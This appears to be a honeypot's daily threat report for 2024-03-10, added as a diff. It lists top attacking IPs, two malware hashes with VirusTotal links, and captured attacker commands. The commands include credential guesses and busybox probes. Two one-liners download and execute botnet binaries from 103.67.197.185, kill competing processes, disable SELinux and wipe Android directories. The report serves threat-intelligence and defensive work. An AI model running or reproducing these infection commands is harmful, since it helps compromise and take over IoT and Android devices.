@@ -1,0 +1,35 @@
+Top 5 IPs for 2024-03-10 :
+
+122.226.191.252
+39.98.81.64
+165.22.143.109
+115.91.84.132
+89.132.167.147
+
+Malware Download:
+6d79e599e722c9647fbafa06a6b8190785710a37a14d9db2f770a7f195f10e5d
+https://www.virustotal.com/gui/file/6d79e599e722c9647fbafa06a6b8190785710a37a14d9db2f770a7f195f10e5d
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+
+Malcious Commands seen:
+
+mother
+...fucker
+root
+...Win1doW$
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox JSETL
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JSETL
+tftp; wget; /bin/busybox JSETL
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox JSETL
+
+
+/shell?pkill+-9+arm;pkill+-9+arm7;cd+/tmp/;rm+-rf+most*;wget+http:/\\/103.67.197.185/most-arm7;+chmod+777+most-arm7;./most-arm7+exploitprivate;wget+http:/\\/103.67.197.185/most-arm;+chmod+777+most-arm;./most-arm+exploitprivate;rm+-rf+most*
+
+toybox top -b -n 1 | awk '$9 > 20 {print $1}' | toybox xargs kill -9;toybox top -b -n 1 | awk '$9 > 20 {print $1}' | su 0 toybox xargs kill -9;toybox pkill -9 M;toybox pkill -9 arm;toybox pkill -9 arm7;toybox pkill -9 x86;toybox pkill -9 x86_64;su 0 toybox pkill -9 arm;su 0 toybox pkill -9 arm7;su 0 toybox pkill -9 x86;su 0 toybox pkill -9 x86_64;su 0 rm -rf /data/local;su 0 mkdir /data/local/;su 0 mkdir /data/local/tmp;su 0 chmod 777 /data/local;su 0 chmod 777 /data/local/tmp;chmod 777 /data/local/tmp; cd /data/local/tmp || cd /data/local/.most || cd /data/local/most; rm -rf *;setenforce 0;busybox wget http://103.67.197.185/and || su 0 busybox wget http://103.67.197.185/and;chmod 777 and || su 0 chmod 777 and;sh and;su 0 mv /data/local/tmp /data/local/.most;su 0 chmod 777 /data/local;su 0 echo hacker > /data/local/tmp;su 0 chmod 444 /data/local;ulimit 999999
